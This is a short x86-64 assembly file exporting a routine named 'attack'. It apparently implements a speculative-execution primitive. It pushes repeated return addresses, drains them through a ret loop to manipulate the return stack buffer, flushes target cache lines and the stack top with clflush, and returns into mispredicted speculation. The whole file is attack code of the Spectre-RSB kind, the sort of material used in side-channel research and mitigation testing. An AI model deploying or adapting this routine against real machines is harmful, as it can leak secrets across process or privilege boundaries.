section .text

%define N 64
%define CACHE_LINE 0x400

global attack

attack:
	mov rbp, rsi
	leave

	lea rbx, [.ret_drain]
	mov rax, rdi
	dec rax

	.fill_stack:
		test rax, rax
		jz .ret_drain_pre

		push rbx
		dec rax
		jmp .fill_stack

	.ret_drain_pre:
		mov rax, rdi
		dec rax

	.ret_drain:
		test rax, rax
		jz .end_ret_drain
		dec rax
		mfence
		nop
		ret

	.end_ret_drain:
		mfence
		nop

	mov rax, N
	.flush_target:
		clflush [rdx]
		nop
		add rdx, CACHE_LINE
		dec rax
		test rax, rax
		jnz .flush_target

	clflush [rsp]
	nop
	mfence
	nop
	ret

	ud2
